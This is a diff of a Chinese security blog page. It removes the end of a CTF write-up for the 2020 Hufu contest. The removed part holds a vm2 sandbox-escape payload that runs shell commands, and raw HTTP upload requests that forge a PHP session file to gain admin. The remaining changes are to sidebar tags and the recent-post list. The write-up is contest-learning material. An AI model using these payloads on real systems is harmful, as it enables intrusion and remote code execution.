-真的是 PHP 嘛</code></pre><p>刚开始还真的以为是php,再输入console的时候返回 <code>[object Object]</code>，这题应该是nodejs</p>
-<p>在网上找到<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">类似的题目</a></p>
-<p>在vm2的issue中找到 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p>
-<p>payload:</p>
-<pre><code class="javascript">const axios = require(&#39;axios&#39;)
-const untrusted = &#39;(&#39; + function(){
-    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
-    try{
-        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
-    }catch(e){
-        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();
-    }
-}+&#39;)()&#39;;
-const content = Buffer.from(untrusted).toString(&#39;hex&#39;)
-axios.get(
-&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;
-).then(p =&gt; {
-    console.log(p.data)
-}).catch(p =&gt; {
-    console.log((p.response.data))
-})
-</code></pre>
-<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?php
-error_reporting(0);
-session_save_path(&quot;/var/babyctf/&quot;);
-session_start();
-require_once &quot;/flag&quot;;
-highlight_file(__FILE__);
-if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
-{
-    $filename=&#39;/var/babyctf/success.txt&#39;;
-    if(file_exists($filename)){
-            safe_delete($filename);
-            die($flag);
-    }
-}
-else{
-    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
-}
-$direction = filter_input(INPUT_POST, &#39;direction&#39;);
-$attr = filter_input(INPUT_POST, &#39;attr&#39;);
-$dir_path = &quot;/var/babyctf/&quot;.$attr;
-if($attr===&quot;private&quot;){
-    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
-}
-if($direction === &quot;upload&quot;){
-    try{
-        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
-            throw new RuntimeException(&#39;invalid upload&#39;);
-        }
-        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
-        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
-        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
-            throw new RuntimeException(&#39;invalid file path&#39;);
-        }
-        @mkdir($dir_path, 0700, TRUE);
-        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
-            $upload_result = &quot;uploaded&quot;;
-        }else{
-            throw new RuntimeException(&#39;error while saving&#39;);
-        }
-    } catch (RuntimeException $e) {
-        $upload_result = $e-&gt;getMessage();
-    }
-} elseif ($direction === &quot;download&quot;) {
-    try{
-        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
-        $file_path = $dir_path.&quot;/&quot;.$filename;
-        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
-            throw new RuntimeException(&#39;invalid file path&#39;);
-        }
-        if(!file_exists($file_path)) {
-            throw new RuntimeException(&#39;file not exist&#39;);
-        }
-        header(&#39;Content-Type: application/force-download&#39;);
-        header(&#39;Content-Length: &#39;.filesize($file_path));
-        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
-        if(readfile($file_path)){
-            $download_result = &quot;downloaded&quot;;
-        }else{
-            throw new RuntimeException(&#39;error while saving&#39;);
-        }
-    } catch (RuntimeException $e) {
-        $download_result = $e-&gt;getMessage();
-    }
-    exit;
-}
-?&gt;</code></pre>
-<p>因为上传目录和sess文件所在目录相同，可以伪造sess</p>
-<pre><code>POST / HTTP/1.1
-Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
-Content-Length: 395
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: null
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;
-Connection: close
-
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm
-Content-Disposition: form-data; name=&quot;direction&quot;
-
-upload
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm
-Content-Disposition: form-data; name=&quot;attr&quot;
-
-
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm
-Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
-Content-Type: text/plain
-
-\x08usernames:5:&quot;admin&quot;;
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
-</code></pre><p>成功伪造admin身份</p>
-<p>接下来就是要弄个success.txt了，虽然我们文件名会被加个后缀</p>
-<p>但是我们可以通过创建<code>success.txt</code>文件夹来达到相同效果</p>
-<pre><code class="php">POST / HTTP/1.1
-Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
-Content-Length: 406
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: null
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffd
-Connection: close
-
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm
-Content-Disposition: form-data; name=&quot;direction&quot;
-
-upload
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm
-Content-Disposition: form-data; name=&quot;attr&quot;
-
-success.txt
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm
-Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
-Content-Type: text/plain
-
-usernames:5:&quot;admin&quot;;
-------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/">http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="cka3ckr1u0007v4v08dwn5ye5" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -4808,7 +4783,7 @@ Content-Type: text/plain
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
     </div>
   </div>
 
@@ -4818,7 +4793,7 @@ Content-Type: text/plain
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16px;">web</a> <a href="/tags/wp/" style="font-size: 18px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 12px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -4840,6 +4815,10 @@ Content-Type: text/plain
       <ul>
         
           <li>
+            <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
           </li>
         
@@ -4853,10 +4832,6 @@ Content-Type: text/plain
         
           <li>
             <a href="/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/">羊城杯2020</a>
-          </li>
-        
-          <li>
-            <a href="/2020/09/07/DDCTF2020/">DDCTF2020</a>
           </li>
         
       </ul>
